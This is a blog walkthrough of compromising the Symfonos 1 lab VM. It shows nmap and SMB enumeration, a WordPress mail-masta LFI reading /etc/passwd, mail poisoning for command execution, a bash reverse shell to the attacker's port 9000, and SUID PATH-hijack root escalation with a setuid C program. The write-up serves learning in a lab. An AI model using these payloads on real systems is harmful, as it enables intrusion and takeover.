&lt;pre tabindex="0">&lt;code>Nmap scan report for 192.168.191.128
Host is up (0.00025s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
| 2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
| 256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_ 256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp open smtp Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after: 2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp open http Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn&amp;#39;t have a title (text/html).
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.5.16-Debian)
| Computer name: symfonos
| NetBIOS computer name: SYMFONOS\x00
| Domain name: \x00
| FQDN: symfonos
|_ System time: 2021-01-21T13:48:08-06:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2021-01-21T19:48:08
|_ start_date: N/A
&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
&lt;p>Using enum4linux-ng we get 2 pieces of useful information.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>enum4linux-ng.py -A 192.168.191.128:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>A user &lt;strong>helios&lt;/strong> is discovered&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos2.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>and the &lt;strong>anonymous&lt;/strong> share is accessible without credentials.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos3.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Using smbclient to access the share, there is a txt file.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.128&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos4.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Looking at the contents of attention.txt:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos5.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Now we have a username and possible passwords. The combination &lt;strong>helios:qwerty&lt;/strong> works and we can access
the helios share.&lt;/p>
&lt;p>We get access to more txt files, but only the todo.txt has valuable information.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos6.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>It gives an endpoint,that we can access on the webserver.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos7.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;h2 id="http-80">HTTP (80)&lt;/h2>
&lt;p>When we access the endpoint we end up on a wordpress instance.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos8.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token &lt;span style="color:#f92672">[&lt;/span>redacted&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
&lt;li>mail-masta 1.0:&lt;/li>
&lt;/ol>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos9.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;ol start="2">
&lt;li>site-editor 1.1.1&lt;/li>
&lt;/ol>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos10.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Using the PoC available on exploitdb: &lt;a href="https://www.exploit-db.com/exploits/40290/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40290/&lt;/a>
, we can craft this url
to read files such as /etc/passwd:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl&lt;span style="color:#f92672">=&lt;/span>/etc/passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos11.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;h1 id="getting-shell-as-helios---lfi-to-rce">Getting shell as helios - LFI to RCE&lt;/h1>
&lt;p>A typical method to escalate to RCE using LFI is poisoning log files but I wasn&amp;rsquo;t able to load any log
file to use this method.
With the presence of port 25 we can try sending an email and try accessing the email using LFI.&lt;/p>
&lt;p>Sending email with payload:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos12.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-url" data-lang="url">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos13.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Now we can get a reverse shell using this payload:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>/bin/bash -c &lt;span style="color:#e6db74">&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
&lt;p>Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -perm -4000 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos14.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>After running it and then running strings against it, it calls the curl command when executed.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos15.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>Since it doesn&amp;rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
curl command.&lt;/p>
&lt;p>In my custom curl script I get a copy of bash and give it suid permissions:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos16.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;h3 id="rooted">Rooted&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos17.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;p>Better way to handle the sending email part using sendEmail:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style="color:#e6db74">&amp;#34;Test Subject&amp;#34;&lt;/span> -m &lt;span style="color:#e6db74">&amp;#34;Test Message&amp;#34;&lt;/span> -o tls&lt;span style="color:#f92672">=&lt;/span>no
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">setgid&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">setuid&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">execl&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos18.png" alt="symfonos1" class="center" style="border-radius: 8px;" />
&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p>
&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p></content></item></channel></rss>